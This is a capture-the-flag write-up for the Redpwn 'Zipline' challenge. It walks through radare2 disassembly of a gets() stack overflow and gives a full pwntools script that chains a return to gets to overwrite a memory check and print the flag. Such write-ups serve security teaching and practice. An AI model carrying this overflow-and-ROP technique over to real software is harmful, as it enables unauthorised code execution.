## Redpwn CTF Zipline Challenge

### Challenge Info

__ctf__: `Redpwn` \
__challenge__: `Zipline` \
__category__: `Pwn` \
__solves__: `141/926` \
__points__: `50` \
__solver__: `ordbl0ke` \ 
__description__: `written by: blevy, nc chall2.2019.redpwn.net 4005` \
__original write up__: [here](https://github.com/dissect-ctu/ctfs/tree/master/2019/Redpwn_CTF/pwn_Zipline_50pts) 

---

We are given binary file `zipline`.

### Write-up

```bash
zipline: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=477e3fba96c095925fe6e4b7983eb40627ea5dbd, not stripped
```
The file is 32-bit executable, not stripped, so I headed straight to `radare2` to disassemble it.

The analysis revealed that `main` function calls two subsequent functions, `zipline` and `i_got_u`. `zipline` function asks for user input and fails to check for boundaries and thus produces stack overflow vulnerability. The `i_got_u` function discloses flag(opens and prints file `flag.txt`) if certain memory block does not contain zeroes(this block is initialized to zeroes).

It became pretty clear now, that we are supposed to use the vulnerability in `zipline` function to alter the content of particular memory block (8 bytes) initialized to zeroes. 

#### Vulnerability

Asking `radare2` to disassemble `zipline` function (`pdf @ sym.zipline`) produces the following output:

```asm
	; var char *s @ ebp-0x12
	; var int local_4h @ ebp-0x4
	; CALL XREF from sym.main (0x8049564)
	0x080494ce      55             push ebp
	0x080494cf      89e5           mov ebp, esp
	0x080494d1      53             push ebx
	0x080494d2      83ec14         sub esp, 0x14
	0x080494d5      e8a3000000     call sym.__x86.get_pc_thunk.ax
	0x080494da      05262b0000     add eax, 0x2b26             ; '&+'
	0x080494df      83ec0c         sub esp, 0xc
	0x080494e2      8d55ee         lea edx, dword [s]
	0x080494e5      52             push edx                    ; char *s
	0x080494e6      89c3           mov ebx, eax
	0x080494e8      e873fbffff     call sym.imp.gets           ; char *gets(char *s)
 	0x080494ed      83c410         add esp, 0x10
	0x080494f0      90             nop
	0x080494f1      8b5dfc         mov ebx, dword [local_4h]
	0x080494f4      c9             leave
	0x080494f5      c3             ret
```

We can immediately spot the vulnerable call to `gets` that accepts user input and stores it to `ebp-0x12` referencing local buffer. We can thus overflow this buffer easily. 

#### Exploitation

From the initial analysis we know that in order to get our flag, we need to alter memory block. Let's have a look what is meant by this. At the beginning of `i_got_u` function, we have the following:
```asm
0x080a0113      0fb683410000.  movzx eax, byte [ebx + 0x41] ; [0x41:1]=255 ; 'A' ; 65
0x080a011a      84c0           test al, al
0x080a011c      0f8431010000   je 0x80a0253
0x080a0122      0fb683420000.  movzx eax, byte [ebx + 0x42] ; [0x42:1]=255 ; 'B' ; 66
0x080a0129      84c0           test al, al
0x080a012b      0f8422010000   je 0x80a0253
0x080a0131      0fb683430000.  movzx eax, byte [ebx + 0x43] ; [0x43:1]=255 ; 'C' ; 67
0x080a0138      84c0           test al, al
0x080a013a      0f8413010000   je 0x80a0253
0x080a0140      0fb683440000.  movzx eax, byte [ebx + 0x44] ; [0x44:1]=255 ; 'D' ; 68
0x080a0147      84c0           test al, al
0x080a0149      0f8404010000   je 0x80a0253
0x080a014f      0fb683450000.  movzx eax, byte [ebx + 0x45] ; [0x45:1]=255 ; 'E' ; 69
0x080a0156      84c0           test al, al
0x080a0158      0f84f5000000   je 0x80a0253
0x080a015e      0fb683460000.  movzx eax, byte [ebx + 0x46] ; [0x46:1]=255 ; 'F' ; 70
0x080a0165      84c0           test al, al
0x080a0167      0f84e6000000   je 0x80a0253
0x080a016d      0fb683470000.  movzx eax, byte [ebx + 0x47] ; [0x47:1]=255 ; 'G' ; 71
0x080a0174      84c0           test al, al
0x080a0176      0f84d7000000   je 0x80a0253
0x080a017c      0fb683480000.  movzx eax, byte [ebx + 0x48] ; [0x48:1]=255 ; 'H' ; 72
0x080a0183      84c0           test al, al
0x080a0185      0f84c8000000   je 0x80a0253
```
We can see that these 8 bytes are gradually checked to contain zero. If some does, the program jumps to the end of the function, otherwise, the flag is printed.
We found out that the value of `ebx` is the same each time, and thus found out the address where we need to start altering: `0x804c041`. 

Since the ROP gadgets I found in the executable, didn't contain any write-to-memory gadgets, I decided to use the `gets` function. 

The idea is as follows: once we overflow the buffer, we place address of `gets` in `plt` as our return point followed by value `0x804c041`, which will be interpreted as argument for `gets` and thus the target address. When this `gets` is called, we will send 8 `A`s on standard input and thus alter the 8 bytes on address `0x804c041`. As a returning point from the `gets` we want to jump to function `i_got_u` which will print the flag for us.

#### Exploit

Here is the exploit code as described earlier.

```python
from pwn import*
import time

elf = ELF('./zipline')
p = process('./zipline')

offset = 0x16*'A'
gets_plt = p32(elf.plt['gets']) # 0x08049060 
ret_addr = call_i_got_u = p32(0x08049569) # address of call i_got_u instruction
target_addr = 0x804c041

gets_arg = p32(target_addr)

log.info('plt gets address: ' + hex(elf.plt['gets']))

payload = offset
payload += gets_plt
payload += ret_addr
payload += gets_arg

got = p.recvline()
log.info('received: ' + got)
p.sendline(payload)
p.sendline('AAAAAAAAAAA') # this is the input for the gets that we called
flag = p.recvline()

log.info(flag)
```

#### References
